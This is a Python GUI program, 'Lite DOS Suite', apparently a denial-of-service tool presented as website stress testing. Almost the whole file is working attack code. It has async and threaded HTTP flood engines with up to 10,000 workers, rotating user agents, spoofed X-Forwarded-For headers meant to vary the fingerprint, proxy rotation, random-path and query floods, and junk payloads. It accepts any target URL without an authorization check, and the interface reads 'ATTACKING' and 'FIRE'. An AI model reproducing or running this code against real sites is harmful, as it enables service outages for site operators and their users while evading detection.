#!/usr/bin/env python3
"""
Lite DOS GUI Suite
Overpowered & Overkill Website Stress Testing Tool
For Windows — Advanced Level
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import asyncio
import aiohttp
import random
import string
import time
import json
import os
import sys
import socket
import ssl
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict
from typing import List, Optional, Dict, Callable
import hashlib
import base64

# ==================== CONFIG & DATA ====================

DEFAULT_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36",
    "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18",
    "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
]

ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
]

ENCODING_HEADERS = ["gzip, deflate, br", "identity", "gzip, deflate"]

LANG_HEADERS = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "en;q=0.7"]

CACHE_HEADERS = [
    "no-cache", "max-age=0", "no-store", "must-revalidate", "proxy-revalidate"
]

METHODS = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "PATCH"]

@dataclass
class AttackConfig:
    target: str = ""
    threads: int = 500
    duration: int = 60
    timeout: int = 10
    method: str = "GET"
    use_async: bool = True
    use_proxies: bool = False
    proxy_list: List[str] = None
    random_ua: bool = True
    random_payload: bool = False
    keep_alive: bool = True
    follow_redirects: bool = False
    ssl_verify: bool = False
    delay: float = 0.0
    ramp_up: bool = False
    http_version: str = "1.1"
    custom_headers: Dict[str, str] = None
    payload_size: int = 0
    path_randomize: bool = False
    query_flood: bool = False
    cookie_jar: bool = True
    connection_pool: int = 100
    
    def __post_init__(self):
        if self.proxy_list is None:
            self.proxy_list = []
        if self.custom_headers is None:
            self.custom_headers = {}

# ==================== PAYLOAD GENERATORS ====================

class PayloadFactory:
    @staticmethod
    def random_string(length: int = 16) -> str:
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    @staticmethod
    def random_json(size: int = 256) -> str:
        data = {
            "id": PayloadFactory.random_string(8),
            "timestamp": time.time(),
            "data": base64.b64encode(os.urandom(size)).decode(),
            "nonce": hashlib.sha256(os.urandom(32)).hexdigest()[:16],
            "junk": ''.join(random.choices(string.ascii_letters, k=size))
        }
        return json.dumps(data)
    
    @staticmethod
    def random_form(size: int = 256) -> str:
        return urllib.parse.urlencode({
            "field_" + str(i): PayloadFactory.random_string(random.randint(8, 32))
            for i in range(size // 32)
        })
    
    @staticmethod
    def random_xml(size: int = 256) -> str:
        return f"""<?xml version="1.0"?>
        <request>
            <id>{PayloadFactory.random_string(16)}</id>
            <data>{base64.b64encode(os.urandom(size)).decode()}</data>
            <timestamp>{time.time()}</timestamp>
        </request>"""
    
    @staticmethod
    def random_path() -> str:
        depth = random.randint(1, 5)
        return '/' + '/'.join(PayloadFactory.random_string(random.randint(4, 12)) for _ in range(depth))
    
    @staticmethod
    def random_query() -> str:
        params = random.randint(5, 20)
        return '?' + '&'.join(
            f"{PayloadFactory.random_string(6)}={PayloadFactory.random_string(random.randint(4, 20))}"
            for _ in range(params)
        )

# ==================== REQUEST BUILDERS ====================

class RequestBuilder:
    def __init__(self, config: AttackConfig):
        self.config = config
        self.payload_factory = PayloadFactory()
        self.session_cookies = {}
    
    def build_headers(self) -> Dict[str, str]:
        headers = {
            "User-Agent": random.choice(DEFAULT_UAS) if self.config.random_ua else DEFAULT_UAS[0],
            "Accept": random.choice(ACCEPT_HEADERS),
            "Accept-Language": random.choice(LANG_HEADERS),
            "Accept-Encoding": random.choice(ENCODING_HEADERS),
            "Cache-Control": random.choice(CACHE_HEADERS),
            "Connection": "keep-alive" if self.config.keep_alive else "close",
            "DNT": "1",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "TE": "trailers",
        }
        
        if self.config.cookie_jar:
            headers["Cookie"] = self._generate_cookie()
        
        # Random extra headers to vary fingerprint
        if random.random() > 0.5:
            headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers["X-Real-IP"] = headers["X-Forwarded-For"]
        
        if random.random() > 0.7:
            headers["Referer"] = f"https://{self.payload_factory.random_string(10)}.com/{self.payload_factory.random_string(8)}"
        
        headers.update(self.config.custom_headers)
        return headers
    
    def _generate_cookie(self) -> str:
        cookies = [
            f"session={self.payload_factory.random_string(32)}",
            f"token={hashlib.sha256(os.urandom(16)).hexdigest()}",
            f"uid={random.randint(100000, 999999)}",
            f"visit={int(time.time())}",
        ]
        return "; ".join(cookies)
    
    def build_url(self) -> str:
        url = self.config.target
        if self.config.path_randomize:
            parsed = urllib.parse.urlparse(url)
            path = self.payload_factory.random_path()
            url = urllib.parse.urlunparse(parsed._replace(path=path))
        if self.config.query_flood:
            parsed = urllib.parse.urlparse(url)
            query = self.payload_factory.random_query()
            url = urllib.parse.urlunparse(parsed._replace(query=query[1:]))
        return url
    
    def build_payload(self) -> Optional[bytes]:
        if not self.config.random_payload or self.config.payload_size <= 0:
            return None
        
        content_types = [
            "application/json",
            "application/x-www-form-urlencoded",
            "text/xml",
            "text/plain",
            "multipart/form-data",
        ]
        
        ctype = random.choice(content_types)
        
        if ctype == "application/json":
            data = self.payload_factory.random_json(self.config.payload_size)
        elif ctype == "application/x-www-form-urlencoded":
            data = self.payload_factory.random_form(self.config.payload_size)
        elif ctype == "text/xml":
            data = self.payload_factory.random_xml(self.config.payload_size)
        else:
            data = os.urandom(self.config.payload_size).decode('latin-1', errors='ignore')
        
        return data.encode('utf-8')
    
    def get_content_type(self) -> str:
        if self.config.random_payload:
            return random.choice([
                "application/json",
                "application/x-www-form-urlencoded",
                "text/xml",
                "text/plain",
            ])
        return "application/x-www-form-urlencoded"

# ==================== ATTACK ENGINES ====================

class StatsCollector:
    def __init__(self):
        self.lock = threading.Lock()
        self.requests_sent = 0
        self.responses_received = 0
        self.bytes_sent = 0
        self.bytes_received = 0
        self.errors = 0
        self.status_codes: Dict[int, int] = {}
        self.start_time = 0.0
        self.running = False
        self.peak_rps = 0.0
        self._rps_window = []
    
    def record_request(self, bytes_sent: int = 0):
        with self.lock:
            self.requests_sent += 1
            self.bytes_sent += bytes_sent
    
    def record_response(self, status: int, bytes_recv: int = 0):
        with self.lock:
            self.responses_received += 1
            self.bytes_received += bytes_recv
            self.status_codes[status] = self.status_codes.get(status, 0) + 1
    
    def record_error(self):
        with self.lock:
            self.errors += 1
    
    def get_rps(self) -> float:
        elapsed = time.time() - self.start_time
        if elapsed <= 0:
            return 0.0
        return self.requests_sent / elapsed
    
    def get_current_rps(self) -> float:
        now = time.time()
        self._rps_window = [t for t in self._rps_window if now - t <= 1.0]
        return len(self._rps_window)
    
    def add_rps_tick(self):
        self._rps_window.append(time.time())
        current = self.get_current_rps()
        if current > self.peak_rps:
            self.peak_rps = current
    
    def snapshot(self) -> dict:
        with self.lock:
            elapsed = time.time() - self.start_time
            return {
                "requests_sent": self.requests_sent,
                "responses_received": self.responses_received,
                "errors": self.errors,
                "rps": round(self.get_rps(), 2),
                "current_rps": round(self.get_current_rps(), 2),
                "peak_rps": round(self.peak_rps, 2),
                "bytes_sent_mb": round(self.bytes_sent / (1024*1024), 2),
                "bytes_recv_mb": round(self.bytes_received / (1024*1024), 2),
                "elapsed": round(elapsed, 2),
                "status_codes": dict(self.status_codes),
            }

class AsyncAttackEngine:
    def __init__(self, config: AttackConfig, stats: StatsCollector, log_callback: Callable):
        self.config = config
        self.stats = stats
        self.log = log_callback
        self.builder = RequestBuilder(config)
        self.stop_event = threading.Event()
        self.connector = None
        self.session = None
    
    async def create_session(self):
        ssl_context = ssl.create_default_context()
        if not self.config.ssl_verify:
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
        
        timeout = aiohttp.ClientTimeout(total=self.config.timeout, connect=5)
        
        self.connector = aiohttp.TCPConnector(
            limit=self.config.connection_pool,
            limit_per_host=self.config.connection_pool,
            enable_cleanup_closed=True,
            force_close=not self.config.keep_alive,
            ssl=ssl_context,
        )
        
        self.session = aiohttp.ClientSession(
            connector=self.connector,
            timeout=timeout,
            trust_env=True,
        )
    
    async def fire_request(self) -> bool:
        try:
            url = self.builder.build_url()
            headers = self.builder.build_headers()
            payload = self.builder.build_payload()
            method = self.config.method if self.config.method != "RANDOM" else random.choice(METHODS)
            
            if payload:
                headers["Content-Type"] = self.builder.get_content_type()
            
            proxy = None
            if self.config.use_proxies and self.config.proxy_list:
                proxy = random.choice(self.config.proxy_list)
            
            kwargs = {
                "headers": headers,
                "allow_redirects": self.config.follow_redirects,
                "proxy": proxy,
            }
            
            if payload and method in ["POST", "PUT", "PATCH"]:
                kwargs["data"] = payload
            
            start = time.time()
            async with self.session.request(method, url, **kwargs) as resp:
                body = await resp.read()
                elapsed = time.time() - start
                
                self.stats.record_request(len(str(headers)) + len(url) + len(payload or b''))
                self.stats.record_response(resp.status, len(body))
                self.stats.add_rps_tick()
                
                if resp.status >= 500:
                    self.log(f"[SERVER ERROR] {resp.status} | {elapsed:.3f}s | {url[:60]}...")
                
                return True
                
        except asyncio.TimeoutError:
            self.stats.record_error()
            return False
        except Exception as e:
            self.stats.record_error()
            if random.random() > 0.95:  # Log only 5% of errors to reduce spam
                self.log(f"[ERROR] {str(e)[:80]}")
            return False
    
    async def worker(self, worker_id: int):
        while not self.stop_event.is_set():
            await self.fire_request()
            if self.config.delay > 0:
                await asyncio.sleep(self.config.delay)
    
    async def run(self):
        await self.create_session()
        self.stats.start_time = time.time()
        self.stats.running = True
        
        workers = []
        for i in range(self.config.threads):
            workers.append(asyncio.create_task(self.worker(i)))
            if self.config.ramp_up:
                await asyncio.sleep(0.01)  # Ramp up gradually
        
        await asyncio.sleep(self.config.duration)
        self.stop_event.set()
        
        for w in workers:
            w.cancel()
        
        await self.session.close()
        await self.connector.close()
        self.stats.running = False

class ThreadedAttackEngine:
    def __init__(self, config: AttackConfig, stats: StatsCollector, log_callback: Callable):
        self.config = config
        self.stats = stats
        self.log = log_callback
        self.builder = RequestBuilder(config)
        self.stop_event = threading.Event()
    
    def fire_request(self):
        try:
            import requests
            url = self.builder.build_url()
            headers = self.builder.build_headers()
            payload = self.builder.build_payload()
            method = self.config.method if self.config.method != "RANDOM" else random.choice(METHODS)
            
            if payload:
                headers["Content-Type"] = self.builder.get_content_type()
            
            proxies = None
            if self.config.use_proxies and self.config.proxy_list:
                p = random.choice(self.config.proxy_list)
                proxies = {"http": p, "https": p}
            
            kwargs = {
                "headers": headers,
                "timeout": self.config.timeout,
                "allow_redirects": self.config.follow_redirects,
                "verify": self.config.ssl_verify,
                "proxies": proxies,
            }
            
            if payload and method in ["POST", "PUT", "PATCH"]:
                kwargs["data"] = payload
            
            start = time.time()
            resp = requests.request(method, url, **kwargs)
            elapsed = time.time() - start
            
            self.stats.record_request(len(str(headers)) + len(url) + len(payload or b''))
            self.stats.record_response(resp.status_code, len(resp.content))
            self.stats.add_rps_tick()
            
            if resp.status_code >= 500:
                self.log(f"[SERVER ERROR] {resp.status_code} | {elapsed:.3f}s")
                
        except Exception as e:
            self.stats.record_error()
            if random.random() > 0.95:
                self.log(f"[ERROR] {str(e)[:80]}")
    
    def worker(self):
        while not self.stop_event.is_set():
            self.fire_request()
            if self.config.delay > 0:
                time.sleep(self.config.delay)
    
    def run(self):
        self.stats.start_time = time.time()
        self.stats.running = True
        
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = []
            for i in range(self.config.threads):
                futures.append(executor.submit(self.worker))
                if self.config.ramp_up:
                    time.sleep(0.01)
            
            time.sleep(self.config.duration)
            self.stop_event.set()
            
            for f in as_completed(futures):
                try:
                    f.result(timeout=1)
                except:
                    pass
        
        self.stats.running = False

# ==================== GUI ====================

class LiteDOSGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Lite DOS Suite — Advanced Stress Testing Tool")
        self.root.geometry("1200x800")
        self.root.configure(bg="#0d0d0d")
        self.root.minsize(1000, 700)
        
        self.config = AttackConfig()
        self.stats = StatsCollector()
        self.engine = None
        self.engine_thread = None
        self.update_job = None
        
        self.setup_styles()
        self.build_ui()
        self.log("Lite DOS Suite initialized. Ready for orders, Boss.")
    
    def setup_styles(self):
        style = ttk.Style()
        style.theme_use("clam")
        
        style.configure("TFrame", background="#0d0d0d")
        style.configure("TLabel", background="#0d0d0d", foreground="#00ff88", font=("Consolas", 10))
        style.configure("TButton", background="#1a1a1a", foreground="#00ff88", font=("Consolas", 10, "bold"))
        style.configure("TEntry", fieldbackground="#1a1a1a", foreground="#00ff88", insertcolor="#00ff88")
        style.configure("TCombobox", fieldbackground="#1a1a1a", foreground="#00ff88")
        style.configure("TCheckbutton", background="#0d0d0d", foreground="#00ff88")
        style.configure("TNotebook", background="#0d0d0d", tabmargins=[2, 5, 2, 0])
        style.configure("TNotebook.Tab", background="#1a1a1a", foreground="#00ff88", padding=[10, 5])
        style.map("TNotebook.Tab", background=[("selected", "#0d0d0d")], foreground=[("selected", "#00ff88")])
        
        style.configure("Header.TLabel", font=("Consolas", 14, "bold"), foreground="#00ff88")
        style.configure("Stats.TLabel", font=("Consolas", 12, "bold"), foreground="#ff3366")
        style.configure("Green.TLabel", foreground="#00ff88")
        style.configure("Red.TLabel", foreground="#ff3366")
        style.configure("Yellow.TLabel", foreground="#ffcc00")
    
    def build_ui(self):
        # Main container
        main = ttk.Frame(self.root)
        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Notebook tabs
        notebook = ttk.Notebook(main)
        notebook.pack(fill=tk.BOTH, expand=True)
        
        # Tab 1: Main Control
        self.build_control_tab(notebook)
        
        # Tab 2: Advanced Settings
        self.build_advanced_tab(notebook)
        
        # Tab 3: Proxies
        self.build_proxy_tab(notebook)
        
        # Tab 4: Logs
        self.build_log_tab(notebook)
        
        # Bottom stats bar
        self.build_stats_bar(main)
    
    def build_control_tab(self, notebook):
        tab = ttk.Frame(notebook)
        notebook.add(tab, text="  MAIN CONTROL  ")
        
        # Target section
        target_frame = tk.LabelFrame(tab, text=" TARGET ", bg="#0d0d0d", fg="#00ff88", 
                                      font=("Consolas", 11, "bold"), padx=10, pady=10)
        target_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(target_frame, text="URL:").pack(side=tk.LEFT, padx=(0, 5))
        self.target_entry = ttk.Entry(target_frame, width=70, font=("Consolas", 11))
        self.target_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        self.target_entry.insert(0, "https://example.com")
        
        # Quick action buttons
        btn_frame = ttk.Frame(target_frame)
        btn_frame.pack(side=tk.RIGHT)
        
        self.start_btn = tk.Button(btn_frame, text="▶ FIRE", bg="#00aa44", fg="white",
                                    font=("Consolas", 12, "bold"), width=12, height=1,
                                    command=self.start_attack, cursor="hand2")
        self.start_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        self.stop_btn = tk.Button(btn_frame, text="■ STOP", bg="#aa0022", fg="white",
                                   font=("Consolas", 12, "bold"), width=12, height=1,
                                   command=self.stop_attack, state=tk.DISABLED, cursor="hand2")
        self.stop_btn.pack(side=tk.LEFT)
        
        # Basic settings grid
        settings_frame = tk.LabelFrame(tab, text=" BASIC SETTINGS ", bg="#0d0d0d", fg="#00ff88",
                                        font=("Consolas", 11, "bold"), padx=10, pady=10)
        settings_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Row 1
        ttk.Label(settings_frame, text="Threads:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        self.threads_var = tk.IntVar(value=500)
        ttk.Spinbox(settings_frame, from_=1, to=10000, textvariable=self.threads_var, width=10).grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Label(settings_frame, text="Duration (sec):").grid(row=0, column=2, sticky=tk.W, padx=5, pady=5)
        self.duration_var = tk.IntVar(value=60)
        ttk.Spinbox(settings_frame, from_=1, to=86400, textvariable=self.duration_var, width=10).grid(row=0, column=3, padx=5, pady=5)
        
        ttk.Label(settings_frame, text="Timeout (sec):").grid(row=0, column=4, sticky=tk.W, padx=5, pady=5)
        self.timeout_var = tk.IntVar(value=10)
        ttk.Spinbox(settings_frame, from_=1, to=120, textvariable=self.timeout_var, width=10).grid(row=0, column=5, padx=5, pady=5)
        
        ttk.Label(settings_frame, text="Method:").grid(row=0, column=6, sticky=tk.W, padx=5, pady=5)
        self.method_var = tk.StringVar(value="GET")
        method_combo = ttk.Combobox(settings_frame, textvariable=self.method_var, 
                                     values=METHODS + ["RANDOM"], width=10, state="readonly")
        method_combo.grid(row=0, column=7, padx=5, pady=5)
        
        # Row 2
        ttk.Label(settings_frame, text="Delay (sec):").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        self.delay_var = tk.DoubleVar(value=0.0)
        ttk.Spinbox(settings_frame, from_=0, to=10, increment=0.1, textvariable=self.delay_var, width=10).grid(row=1, column=1, padx=5, pady=5)
        
        ttk.Label(settings_frame, text="Payload Size:").grid(row=1, column=2, sticky=tk.W, padx=5, pady=5)
        self.payload_size_var = tk.IntVar(value=0)
        ttk.Spinbox(settings_frame, from_=0, to=1048576, textvariable=self.payload_size_var, width=10).grid(row=1, column=3, padx=5, pady=5)
        
        ttk.Label(settings_frame, text="Conn Pool:").grid(row=1, column=4, sticky=tk.W, padx=5, pady=5)
        self.pool_var = tk.IntVar(value=100)
        ttk.Spinbox(settings_frame, from_=10, to=1000, textvariable=self.pool_var, width=10).grid(row=1, column=5, padx=5, pady=5)
        
        # Toggles row
        toggles_frame = ttk.Frame(settings_frame)
        toggles_frame.grid(row=2, column=0, columnspan=8, sticky=tk.W, pady=10)
        
        self.async_var = tk.BooleanVar(value=True)
        self.ramp_var = tk.BooleanVar(value=False)
        self.ua_var = tk.BooleanVar(value=True)
        self.payload_var = tk.BooleanVar(value=False)
        self.keepalive_var = tk.BooleanVar(value=True)
        self.redirect_var = tk.BooleanVar(value=False)
        self.ssl_var = tk.BooleanVar(value=False)
        self.path_var = tk.BooleanVar(value=False)
        self.query_var = tk.BooleanVar(value=False)
        self.cookie_var = tk.BooleanVar(value=True)
        
        ttk.Checkbutton(toggles_frame, text="Async Mode", variable=self.async_var).pack(side=tk.LEFT, padx=5)
        ttk.Checkbutton(toggles_frame, text="Ramp Up", variable=self.ramp_var).pack(side=tk.LEFT, padx=5)
        ttk.Checkbutton(toggles_frame, text="Random UA", variable=self.ua_var).pack(side=tk.LEFT, padx=5)
        ttk.Checkbutton(toggles_frame, text="Random Payload", variable=self.payload_var).pack(side=tk.LEFT, padx=5)
        ttk.Checkbutton(toggles_frame, text="Keep-Alive", variable=self.keepalive_var).pack(side=tk.LEFT, padx=5)
        ttk.Checkbutton(toggles_frame, text="Follow Redirects", variable=self.redirect_var).pack(side=tk.LEFT, padx=5)
        ttk.Checkbutton(toggles_frame, text="SSL Verify", variable=self.ssl_var).pack(side=tk.LEFT, padx=5)
        ttk.Checkbutton(toggles_frame, text="Random Path", variable=self.path_var).pack(side=tk.LEFT, padx=5)
        ttk.Checkbutton(toggles_frame, text="Query Flood", variable=self.query_var).pack(side=tk.LEFT, padx=5)
        ttk.Checkbutton(toggles_frame, text="Cookie Jar", variable=self.cookie_var).pack(side=tk.LEFT, padx=5)
        
        # Live stats display
        self.live_stats_frame = tk.LabelFrame(tab, text=" LIVE STATS ", bg="#0d0d0d", fg="#ff3366",
                                               font=("Consolas", 11, "bold"), padx=10, pady=10)
        self.live_stats_frame.pack(fill=tk.BOTH, expand=True)
        
        self.stats_labels = {}
        stats_grid = [
            ("Requests Sent:", "req_sent", "Green"),
            ("Responses:", "resp_recv", "Green"),
            ("Errors:", "errors", "Red"),
            ("RPS (Avg):", "rps_avg", "Yellow"),
            ("RPS (Current):", "rps_cur", "Yellow"),
            ("Peak RPS:", "peak_rps", "Yellow"),
            ("Data Sent (MB):", "data_sent", "Green"),
            ("Data Rec Recv (MB):", "data_recv", "Green"),
            ("Elapsed:", "elapsed", "Green"),
            ("Status Codes:", "status", "Yellow"),
        ]
        
        for i, (label, key, color) in enumerate(stats_grid):
            row = i // 5
            col = (i % 5) * 2
            ttk.Label(self.live_stats_frame, text=label, style=f"{color}.TLabel").grid(row=row, column=col, sticky=tk.W, padx=5, pady=5)
            self.stats_labels[key] = ttk.Label(self.live_stats_frame, text="0", style=f"{color}.TLabel", font=("Consolas", 12, "bold"))
            self.stats_labels[key].grid(row=row, column=col+1, sticky=tk.W, padx=5, pady=5)
    
    def build_advanced_tab(self, notebook):
        tab = ttk.Frame(notebook)
        notebook.add(tab, text="  ADVANCED  ")
        
        # Custom headers
        headers_frame = tk.LabelFrame(tab, text=" CUSTOM HEADERS (JSON format) ", bg="#0d0d0d", fg="#00ff88",
                                       font=("Consolas", 11, "bold"), padx=10, pady=10)
        headers_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        self.headers_text = scrolledtext.ScrolledText(headers_frame, bg="#1a1a1a", fg="#00ff88",
                                                       font=("Consolas", 10), insertbackground="#00ff88",
                                                       height=8)
        self.headers_text.pack(fill=tk.BOTH, expand=True)
        self.headers_text.insert(tk.END, '{\n  "X-Custom-Header": "value"\n}')
        
        # User agents
        ua_frame = tk.LabelFrame(tab, text=" CUSTOM USER AGENTS (one per line) ", bg="#0d0d0d", fg="#00ff88",
                                  font=("Consolas", 11, "bold"), padx=10, pady=10)
        ua_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        self.ua_text = scrolledtext.ScrolledText(ua_frame, bg="#1a1a1a", fg="#00ff88",
                                                    font=("Consolas", 10), insertbackground="#00ff88",
                                                    height=8)
        self.ua_text.pack(fill=tk.BOTH, expand=True)
        for ua in DEFAULT_UAS[:5]:
            self.ua_text.insert(tk.END, ua + "\n")
        
        # Save/Load config
        cfg_frame = ttk.Frame(tab)
        cfg_frame.pack(fill=tk.X, pady=10)
        
        tk.Button(cfg_frame, text="💾 SAVE CONFIG", bg="#1a1a1a", fg="#00ff88",
                  font=("Consolas", 10, "bold"), command=self.save_config).pack(side=tk.LEFT, padx=5)
        tk.Button(cfg_frame, text="📂 LOAD CONFIG", bg="#1a1a1a", fg="#00ff88",
                  font=("Consolas", 10, "bold"), command=self.load_config).pack(side=tk.LEFT, padx=5)
        tk.Button(cfg_frame, text="🔄 RESET DEFAULTS", bg="#1a1a1a", fg="#ff3366",
                  font=("Consolas", 10, "bold"), command=self.reset_defaults).pack(side=tk.LEFT, padx=5)
    
    def build_proxy_tab(self, notebook):
        tab = ttk.Frame(notebook)
        notebook.add(tab, text="  PROXIES  ")
        
        # Proxy list
        proxy_frame = tk.LabelFrame(tab, text=" PROXY LIST (host:port or http://host:port) ", bg="#0d0d0d", fg="#00ff88",
                                     font=("Consolas", 11, "bold"), padx=10, pady=10)
        proxy_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        self.proxy_text = scrolledtext.ScrolledText(proxy_frame, bg="#1a1a1a", fg="#00ff88",
                                                     font=("Consolas", 10), insertbackground="#00ff88",
                                                     height=15)
        self.proxy_text.pack(fill=tk.BOTH, expand=True)
        
        # Proxy controls
        ctrl_frame = ttk.Frame(tab)
        ctrl_frame.pack(fill=tk.X, pady=10)
        
        self.use_proxy_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(ctrl_frame, text="Enable Proxies", variable=self.use_proxy_var).pack(side=tk.LEFT, padx=5)
        
        tk.Button(ctrl_frame, text="🧪 TEST PROXIES", bg="#1a1a1a", fg="#00ff88",
                  font=("Consolas", 10, "bold"), command=self.test_proxies).pack(side=tk.LEFT, padx=5)
        tk.Button(ctrl_frame, text="🗑️ CLEAR", bg="#1a1a1a", fg="#ff3366",
                  font=("Consolas", 10, "bold"), command=lambda: self.proxy_text.delete(1.0, tk.END)).pack(side=tk.LEFT, padx=5)
    
    def build_log_tab(self, notebook):
        tab = ttk.Frame(notebook)
        notebook.add(tab, text="  LOGS  ")
        
        self.log_text = scrolledtext.ScrolledText(tab, bg="#0d0d0d", fg="#00ff88",
                                                   font=("Consolas", 9), insertbackground="#00ff88",
                                                   state=tk.DISABLED)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        log_btn_frame = ttk.Frame(tab)
        log_btn_frame.pack(fill=tk.X, pady=5)
        
        tk.Button(log_btn_frame, text="🧹 CLEAR LOGS", bg="#1a1a1a", fg="#ff3366",
                  font=("Consolas", 10, "bold"), command=self.clear_logs).pack(side=tk.LEFT, padx=5)
        tk.Button(log_btn_frame, text="💾 EXPORT LOGS", bg="#1a1a1a", fg="#00ff88",
                  font=("Consolas", 10, "bold"), command=self.export_logs).pack(side=tk.LEFT, padx=5)
    
    def build_stats_bar(self, main):
        bar = ttk.Frame(main)
        bar.pack(fill=tk.X, pady=(10, 0))
        
        self.status_label = ttk.Label(bar, text="● IDLE", font=("Consolas", 11, "bold"))
        self.status_label.pack(side=tk.LEFT)
        
        ttk.Label(bar, text=" | Lite DOS Suite v2.0 | ", font=("Consolas", 9)).pack(side=tk.RIGHT)
    
    def log(self, message: str):
        self.log_text.config(state=tk.NORMAL)
        timestamp = time.strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)
    
    def clear_logs(self):
        self.log_text.config(state=tk.NORMAL)
        self.log_text.delete(1.0, tk.END)
        self.log_text.config(state=tk.DISABLED)
    
    def export_logs(self):
        path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
        if path:
            with open(path, 'w') as f:
                f.write(self.log_text.get(1.0, tk.END))
            self.log(f"Logs exported to {path}")
    
    def get_config_from_ui(self) -> AttackConfig:
        proxies = []
        if self.use_proxy_var.get():
            raw = self.proxy_text.get(1.0, tk.END).strip()
            proxies = [p.strip() for p in raw.split('\n') if p.strip()]
        
        custom_headers = {}
        try:
            raw_headers = self.headers_text.get(1.0, tk.END).strip()
            if raw_headers:
                custom_headers = json.loads(raw_headers)
        except:
            self.log("[WARN] Invalid custom headers JSON, ignoring.")
        
        custom_ua = []
        raw_ua = self.ua_text.get(1.0, tk.END).strip()
        if raw_ua:
            custom_ua = [u.strip() for u in raw_ua.split('\n') if u.strip()]
        
        return AttackConfig(
            target=self.target_entry.get().strip(),
            threads=self.threads_var.get(),
            duration=self.duration_var.get(),
            timeout=self.timeout_var.get(),
            method=self.method_var.get(),
            use_async=self.async_var.get(),
            use_proxies=self.use_proxy_var.get(),
            proxy_list=proxies,
            random_ua=self.ua_var.get(),
            random_payload=self.payload_var.get(),
            keep_alive=self.keepalive_var.get(),
            follow_redirects=self.redirect_var.get(),
            ssl_verify=self.ssl_var.get(),
            delay=self.delay_var.get(),
            ramp_up=self.ramp_var.get(),
            payload_size=self.payload_size_var.get(),
            path_randomize=self.path_var.get(),
            query_flood=self.query_var.get(),
            cookie_jar=self.cookie_var.get(),
            connection_pool=self.pool_var.get(),
            custom_headers=custom_headers,
        )
    
    def start_attack(self):
        self.config = self.get_config_from_ui()
        
        if not self.config.target or not self.config.target.startswith(("http://", "https://")):
            messagebox.showerror("Invalid Target", "Enter a valid URL starting with http:// or https://")
            return
        
        self.stats = StatsCollector()
        self.start_btn.config(state=tk.DISABLED, bg="#333333")
        self.stop_btn.config(state=tk.NORMAL, bg="#aa0022")
        self.status_label.config(text="● ATTACKING", foreground="#ff3366")
        
        self.log(f"=" * 60)
        self.log(f"TARGET: {self.config.target}")
        self.log(f"THREADS: {self.config.threads} | DURATION: {self.config.duration}s | METHOD: {self.config.method}")
        self.log(f"ASYNC: {self.config.use_async} | RAMP UP: {self.config.ramp_up}")
        self.log(f"=" * 60)
        
        def run_engine():
            try:
                if self.config.use_async:
                    asyncio.run(self._async_run())
                else:
                    engine = ThreadedAttackEngine(self.config, self.stats, self.log)
                    self.engine = engine
                    engine.run()
            except Exception as e:
                self.log(f"[FATAL] {str(e)}")
            finally:
                self.root.after(0, self._attack_finished)
        
        self.engine_thread = threading.Thread(target=run_engine, daemon=True)
        self.engine_thread.start()
        self.update_stats_loop()
    
    async def _async_run(self):
        engine = AsyncAttackEngine(self.config, self.stats, self.log)
        self.engine = engine
        await engine.run()
    
    def stop_attack(self):
        self.log("[STOP] Abort signal sent...")
        if self.engine:
            self.engine.stop_event.set()
        self._attack_finished()
    
    def _attack_finished(self):
        self.start_btn.config(state=tk.NORMAL, bg="#00aa44")
        self.stop_btn.config(state=tk.DISABLED, bg="#333333")
        self.status_label.config(text="● IDLE", foreground="#00ff88")
        self.log("=" * 60)
        self.log("ATTACK FINISHED")
        snapshot = self.stats.snapshot()
        self.log(f"Total Requests: {snapshot['requests_sent']}")
